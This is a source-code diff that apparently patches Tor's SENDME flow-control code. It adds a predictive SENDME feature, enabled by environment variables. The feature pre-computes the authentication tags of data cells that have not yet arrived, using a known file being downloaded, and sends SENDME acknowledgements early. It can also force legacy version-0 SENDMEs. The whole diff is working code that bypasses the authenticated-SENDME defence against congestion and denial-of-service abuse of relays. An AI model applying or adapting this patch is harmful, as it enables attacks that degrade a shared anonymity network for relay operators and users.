@@ -22,12 +22,233 @@
 #include "core/or/circuituse.h"
 #include "core/or/or_circuit_st.h"
 #include "core/or/relay.h"
+#include "core/or/relay_msg.h"
 #include "core/or/sendme.h"
 #include "core/or/congestion_control_common.h"
 #include "core/or/congestion_control_flow.h"
 #include "feature/nodelist/networkstatus.h"
 #include "lib/ctime/di_ops.h"
+#include "lib/crypt_ops/crypto_digest.h"
+#include "lib/fs/mmap.h"
+#include "lib/string/util_string.h"
 #include "trunnel/sendme_cell.h"
+
+#define PREDICTIVE_SENDME_ADVANCE_CELLS 2
+#define PREDICTIVE_SENDME_SAFE_CELLS 49
+#define RELAY_CELL_PADDING_GAP 4
+#define RELAY_CELL_RANDOM_PADDING_LEN 16
+
+typedef struct predictive_sendme_state_t {
+  tor_mmap_t *file;
+  const circuit_t *circuit;
+  const crypt_path_t *layer_hint;
+  streamid_t stream_id;
+  size_t next_file_offset;
+  unsigned int predictable_cells;
+  unsigned int http_header_match;
+  bool initialized;
+  bool synced;
+  bool prediction_pending;
+  bool compatibility_logged;
+  bool disabled;
+} predictive_sendme_state_t;
+
+static predictive_sendme_state_t predictive_sendme_state;
+
+STATIC bool
+predict_v0_data_tag(const crypto_digest_t *current_digest,
+                    streamid_t stream_id,
+                    const uint8_t *data,
+                    size_t data_len,
+                    unsigned int cell_count,
+                    uint8_t *tag_out)
+{
+  const size_t payload_len =
+    relay_cell_max_payload_size(RELAY_CELL_FORMAT_V0, RELAY_COMMAND_DATA);
+  crypto_digest_t *predicted_digest = NULL;
+  relay_msg_t msg;
+  cell_t cell;
+  bool success = false;
+
+  tor_assert(current_digest);
+  tor_assert(data);
+  tor_assert(tag_out);
+
+  if (stream_id == 0 || cell_count == 0 ||
+      data_len < payload_len * cell_count) {
+    return false;
+  }
+
+  predicted_digest = crypto_digest_dup(current_digest);
+  if (predicted_digest == NULL) {
+    return false;
+  }
+
+  memset(&msg, 0, sizeof(msg));
+  msg.command = RELAY_COMMAND_DATA;
+  msg.stream_id = stream_id;
+  msg.length = payload_len;
+
+  for (unsigned int i = 0; i < cell_count; ++i) {
+    msg.body = data + i * payload_len;
+    if (relay_msg_encode_cell(RELAY_CELL_FORMAT_V0, &msg, &cell) < 0) {
+      goto done;
+    }
+    crypto_digest_add_bytes(predicted_digest, (char *) cell.payload,
+                            CELL_PAYLOAD_SIZE);
+  }
+
+  crypto_digest_get_digest(predicted_digest, (char *) tag_out,
+                           SENDME_TAG_LEN_TOR1);
+  success = true;
+
+ done:
+  crypto_digest_free(predicted_digest);
+  return success;
+}
+
+static predictive_sendme_state_t *
+get_predictive_sendme_state(void)
+{
+  predictive_sendme_state_t *state = &predictive_sendme_state;
+
+  if (state->initialized) {
+    return state->disabled ? NULL : state;
+  }
+  state->initialized = true;
+
+  const char *path = getenv("TOR_PREDICTIVE_SENDME_FILE");
+  if (path == NULL || path[0] == '\0') {
+    state->disabled = true;
+    return NULL;
+  }
+  state->file = tor_mmap_file(path);
+  if (state->file == NULL || state->file->size == 0) {
+    log_warn(LD_PROTOCOL, "Unable to map predictive SENDME input file; "
+                          "predictor disabled");
+    state->disabled = true;
+    return NULL;
+  }
+
+  log_notice(LD_PROTOCOL,
+             "Predictive SENDME enabled with advance_cells=%d version=%s",
+             PREDICTIVE_SENDME_ADVANCE_CELLS,
+             getenv("TOR_SENDME_V0_TEST") != NULL ? "v0" : "v1");
+  return state;
+}
+
+static void
+disable_predictive_sendme(predictive_sendme_state_t *state,
+                          const char *reason)
+{
+  tor_assert(state);
+  tor_assert(reason);
+
+  log_notice(LD_PROTOCOL, "Predictive SENDME disabled: %s", reason);
+  state->disabled = true;
+}
+
+static bool
+predictive_sendme_sync(predictive_sendme_state_t *state,
+                       circuit_t *circ,
+                       crypt_path_t *layer_hint,
+                       const relay_msg_t *msg)
+{
+  static const uint8_t header_end[] = "\r\n\r\n";
+  const uint8_t *file_start = (const uint8_t *) state->file->data;
+  for (size_t i = 0; i < msg->length; ++i) {
+    if (msg->body[i] == header_end[state->http_header_match]) {
+      ++state->http_header_match;
+    } else {
+      state->http_header_match = msg->body[i] == header_end[0] ? 1 : 0;
+    }
+    if (state->http_header_match != ARRAY_LENGTH(header_end) - 1) {
+      continue;
+    }
+
+    const size_t body_offset = i + 1;
+    const size_t body_len = msg->length - body_offset;
+    state->http_header_match = 0;
+    if (body_len > state->file->size ||
+        tor_memneq(file_start, msg->body + body_offset, body_len)) {
+      return false;
+    }
+
+    state->circuit = circ;
+    state->layer_hint = layer_hint;
+    state->stream_id = msg->stream_id;
+    state->next_file_offset = body_len;
+    state->synced = true;
+    log_notice(LD_PROTOCOL,
+               "Predictive SENDME synchronized to HTTP response body");
+    return true;
+  }
+  return false;
+}
+
+static void
+predictive_sendme_note_data(circuit_t *circ,
+                            crypt_path_t *layer_hint,
+                            const relay_msg_t *msg)
+{
+  predictive_sendme_state_t *state = get_predictive_sendme_state();
+  if (state == NULL || !CIRCUIT_IS_ORIGIN(circ) || layer_hint == NULL ||
+      msg == NULL || msg->command != RELAY_COMMAND_DATA ||
+      msg->stream_id == 0) {
+    return;
+  }
+
+  if (!state->compatibility_logged) {
+    log_notice(LD_PROTOCOL, "Predictive SENDME DATA format=%d crypto_kind=%d",
+               layer_hint->relay_cell_format, layer_hint->pvt_crypto.kind);
+    state->compatibility_logged = true;
+  }
+
+  if (
+      layer_hint->relay_cell_format != RELAY_CELL_FORMAT_V0 ||
+      layer_hint->pvt_crypto.kind != RCK_TOR1) {
+    return;
+  }
+
+  if (!state->synced) {
+    if (state->circuit != circ || state->layer_hint != layer_hint ||
+        state->stream_id != msg->stream_id) {
+      state->circuit = circ;
+      state->layer_hint = layer_hint;
+      state->stream_id = msg->stream_id;
+      state->http_header_match = 0;
+    }
+    if (!predictive_sendme_sync(state, circ, layer_hint, msg)) {
+      return;
+    }
+  } else if (state->circuit != circ || state->layer_hint != layer_hint) {
+    return;
+  } else if (state->stream_id != msg->stream_id) {
+    disable_predictive_sendme(state, "interleaved data stream");
+    return;
+  } else {
+    if (state->next_file_offset > state->file->size ||
+        msg->length > state->file->size - state->next_file_offset ||
+        tor_memneq(state->file->data + state->next_file_offset,
+                   msg->body, msg->length)) {
+      disable_predictive_sendme(state, "fixed stream content mismatch");
+      return;
+    }
+    state->next_file_offset += msg->length;
+  }
+
+  const size_t max_payload =
+    relay_cell_max_payload_size(RELAY_CELL_FORMAT_V0, RELAY_COMMAND_DATA);
+  const size_t random_payload_limit = max_payload -
+    RELAY_CELL_PADDING_GAP - RELAY_CELL_RANDOM_PADDING_LEN;
+  if (msg->length <= random_payload_limit) {
+    state->predictable_cells = PREDICTIVE_SENDME_SAFE_CELLS;
+    log_info(LD_PROTOCOL, "Predictive SENDME observed random-padding cell; "
+                          "safe_cells=%u", state->predictable_cells);
+  } else if (state->predictable_cells > 0) {
+    --state->predictable_cells;
+  }
+}
 
 /**
  * Return true iff tag_len is some length we recognize.
@@ -319,6 +540,10 @@ send_circuit_level_sendme(circuit_t *circ, crypt_path_t *layer_hint,
   tor_assert(cell_tag);
 
   emit_version = get_emit_min_version();
+  if (getenv("TOR_SENDME_V0_TEST") != NULL) {
+    emit_version = 0;
+    log_notice(LD_PROTOCOL, "SENDME_V0_TEST emitting version 0 cell");
+  }
   switch (emit_version) {
   case 0x01:
     payload_len = build_cell_payload_v1(cell_tag, tag_len, payload);
@@ -347,6 +572,54 @@ send_circuit_level_sendme(circuit_t *circ, crypt_path_t *layer_hint,
     return -1; /* the circuit's closed, don't continue */
   }
   return 0;
+}
+
+static bool
+predictive_sendme_try_early(circuit_t *circ,
+                            crypt_path_t *layer_hint,
+                            int sendme_inc)
+{
+  predictive_sendme_state_t *state = get_predictive_sendme_state();
+  const int deliver_window = layer_hint ? layer_hint->deliver_window :
+                                          circ->deliver_window;
+  const size_t payload_len =
+    relay_cell_max_payload_size(RELAY_CELL_FORMAT_V0, RELAY_COMMAND_DATA);
+  uint8_t predicted_tag[SENDME_TAG_LEN_TOR1];
+
+  if (state == NULL || !state->synced || state->prediction_pending ||
+      state->circuit != circ || state->layer_hint != layer_hint ||
+      layer_hint == NULL || layer_hint->pvt_crypto.kind != RCK_TOR1 ||
+      get_emit_min_version() != 1 ||
+      deliver_window != CIRCWINDOW_START - sendme_inc +
+                        PREDICTIVE_SENDME_ADVANCE_CELLS ||
+      state->predictable_cells < PREDICTIVE_SENDME_ADVANCE_CELLS ||
+      state->next_file_offset > state->file->size ||
+      payload_len * PREDICTIVE_SENDME_ADVANCE_CELLS >
+        state->file->size - state->next_file_offset) {
+    return false;
+  }
+
+  if (!predict_v0_data_tag(layer_hint->pvt_crypto.c.tor1.b_digest,
+                           state->stream_id,
+                           (const uint8_t *) state->file->data +
+                             state->next_file_offset,
+                           state->file->size - state->next_file_offset,
+                           PREDICTIVE_SENDME_ADVANCE_CELLS,
+                           predicted_tag)) {
+    disable_predictive_sendme(state, "future tag calculation failed");
+    return false;
+  }
+
+  if (send_circuit_level_sendme(circ, layer_hint, predicted_tag,
+                                sizeof(predicted_tag)) < 0) {
+    return false;
+  }
+  state->prediction_pending = true;
+  log_notice(LD_PROTOCOL, "Predictive SENDME sent %d cells early; "
+                          "deliver_window=%d safe_cells=%u",
+             PREDICTIVE_SENDME_ADVANCE_CELLS, deliver_window,
+             state->predictable_cells);
+  return true;
 }
 
 /* Record the sendme tag as expected in a future SENDME, */
@@ -437,16 +710,34 @@ sendme_connection_edge_consider_sending(edge_connection_t *conn)
  * more.
  */
 void
-sendme_circuit_consider_sending(circuit_t *circ, crypt_path_t *layer_hint)
+sendme_circuit_consider_sending(circuit_t *circ, crypt_path_t *layer_hint,
+                                const relay_msg_t *msg)
 {
   bool sent_one_sendme = false;
   const uint8_t *tag;
   size_t tag_len = 0;
   int sendme_inc = sendme_get_inc_count(circ, layer_hint);
 
+  predictive_sendme_note_data(circ, layer_hint, msg);
+  if (predictive_sendme_try_early(circ, layer_hint, sendme_inc)) {
+    return;
+  }
+
   while ((layer_hint ? layer_hint->deliver_window : circ->deliver_window) <=
           CIRCWINDOW_START - sendme_inc) {
     log_debug(LD_CIRC,"Queuing circuit sendme.");
+    predictive_sendme_state_t *state = &predictive_sendme_state;
+    if (state->prediction_pending &&
+        state->circuit == circ && state->layer_hint == layer_hint) {
+      if (layer_hint) {
+        layer_hint->deliver_window += sendme_inc;
+      } else {
+        circ->deliver_window += sendme_inc;
+      }
+      state->prediction_pending = false;
+      log_info(LD_PROTOCOL, "Predictive SENDME completed early window");
+      continue;
+    }
     if (layer_hint) {
       layer_hint->deliver_window += sendme_inc;
       tag = cpath_get_sendme_tag(layer_hint, &tag_len);
